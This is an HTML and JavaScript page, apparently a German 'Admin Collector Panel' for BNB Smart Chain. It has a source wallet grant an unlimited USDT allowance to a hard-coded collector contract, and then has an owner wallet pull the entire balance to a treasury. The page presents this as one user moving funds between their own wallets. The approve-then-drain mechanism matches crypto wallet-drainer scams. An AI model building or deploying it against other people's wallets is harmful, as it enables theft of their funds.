<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Admin Panel ‚Äì BSC Collector</title>
  <style>
    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:10px; }
    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; box-shadow:0 10px 30px rgba(0,0,0,.5); border: 1px solid #1e293b; }
    h2{ margin-top:0; color: #f8fafc; font-size: 20px; text-align: center; }
    .step { background: #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
    .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 8px; }
    button { background:#22c55e; border:none; padding:14px; width:100%; font-size:15px; font-weight:bold; cursor:pointer; border-radius:8px; color: white; transition: 0.2s; }
    button:hover { background: #16a34a; opacity: 0.9; }
    button.secondary { background:#334155; margin-bottom: 8px; }
    button.danger { background: #ef4444; margin-top: 10px; }
    .mono { font-family: monospace; font-size:11px; word-break:break-all; background: #000; padding: 8px; border-radius: 4px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; }
    #status { margin-top:15px; padding: 12px; border-radius: 6px; background: #0f172a; font-size: 13px; text-align: center; min-height: 20px; border: 1px dashed #334155; line-height: 1.4; }
    .info-text { font-size: 11px; color: #94a3b8; margin-top: 10px; text-align: center; }
    .balance-tag { font-size: 10px; color: #eab308; margin-top: 4px; display: block; }
  </style>
</head>
<body>

<div class="box">
  <h2>Admin Collector Panel</h2>

  <div class="step">
    <div class="step-title">Phase 1: Wallet A (Quelle)</div>
    <button class="secondary" onclick="connectWalletA()">1. Wallet A verbinden</button>
    <div class="mono" id="walletAAddress">Nicht verbunden</div>
    <span id="bnbBalance" class="balance-tag"></span>
    
    <button style="margin-top:12px" id="btnApprove" onclick="approveUSDT()">2. USDT Freigabe (Approve)</button>
  </div>

  <div class="step" style="border-left-color: #eab308;">
    <div class="step-title">Phase 2: Owner (Du)</div>
    <p style="font-size:11px; color:#cbd5e1; margin-bottom:8px;">Jetzt in Trust Wallet zur <b>Owner-Wallet</b> wechseln!</p>
    <button class="danger" onclick="collectAll()">3. USDT komplett ziehen</button>
  </div>

  <div id="status">Bereit. Bitte Wallet A verbinden.</div>

  <div class="info-text">
    Netzwerk: <b>BNB Smart Chain (BSC)</b><br>
    Contract: <span style="font-family: monospace; font-size: 9px;">0x61bF...E26B</span>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
<script>
  const COLLECTOR_ADDRESS = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

  const collectorAbi = ["function collectUSDTAll(address from) external"];
  const erc20Abi = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) external view returns (uint256)"
  ];

  let walletA = null;

  function setStatus(msg) { document.getElementById("status").innerHTML = msg; }

  async function checkNetwork(provider) {
    const network = await provider.getNetwork();
    if (network.chainId !== 56n) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });
        return true;
      } catch (e) {
        setStatus("<span style='color:#ef4444'>‚ùå Falsches Netzwerk!</span><br>Bitte oben auf 'BNB Smart Chain' umstellen.");
        return false;
      }
    }
    return true;
  }

  async function connectWalletA() {
    try {
      if (!window.ethereum) return alert("Bitte Trust Wallet nutzen");
      const provider = new ethers.BrowserProvider(window.ethereum);
      
      const isCorrectNetwork = await checkNetwork(provider);
      if (!isCorrectNetwork) return;

      const accounts = await provider.send("eth_requestAccounts", []);
      walletA = accounts[0];
      document.getElementById("walletAAddress").innerText = walletA;
      
      // BNB Balance pr√ºfen
      const balance = await provider.getBalance(walletA);
      const bnb = ethers.formatEther(balance);
      document.getElementById("bnbBalance").innerText = "BNB Guthaben: " + parseFloat(bnb).toFixed(4);

      if (parseFloat(bnb) < 0.001) {
        setStatus("<span style='color:#eab308'>‚ö†Ô∏è Achtung:</span> Zu wenig BNB f√ºr Geb√ºhren vorhanden.");
      } else {
        setStatus("‚úÖ Wallet A bereit f√ºr Freigabe.");
      }
    } catch (e) { 
      console.error(e);
      setStatus("‚ùå Verbindung abgelehnt."); 
    }
  }

  async function approveUSDT() {
    try {
      if (!walletA) return setStatus("‚ùå Erst Schritt 1: Verbinden");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const contract = new ethers.Contract(USDT_ADDRESS, erc20Abi, signer);
      
      setStatus("‚åõ Warte auf Best√§tigung in der App...");
      const tx = await contract.approve(COLLECTOR_ADDRESS, ethers.MaxUint256);
      
      setStatus("‚åõ Transaktion wird verarbeitet...");
      await tx.wait();
      setStatus("‚úÖ Freigabe erteilt!<br><b>Jetzt Wallet zu Owner wechseln.</b>");
    } catch (e) { 
      setStatus("‚ùå Freigabe abgebrochen."); 
    }
  }

  async function collectAll() {
    try {
      if (!walletA) return setStatus("‚ùå Keine Wallet A Adresse gefunden.");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const contract = new ethers.Contract(COLLECTOR_ADDRESS, collectorAbi, signer);
      setStatus("‚åõ Sende Einzugs-Befehl...");
      
      const tx = await contract.collectUSDTAll(walletA);
      await tx.wait();
      
      setStatus("üéâ Erfolg!<br>USDT wurden zur Treasury gesendet.");
    } catch (e) {
      console.error(e);
      setStatus("‚ùå Fehler: " + (e.reason || "Bist du sicher, dass du mit der Owner-Wallet verbunden bist?"));
    }
  }
</script>
</body>
</html>
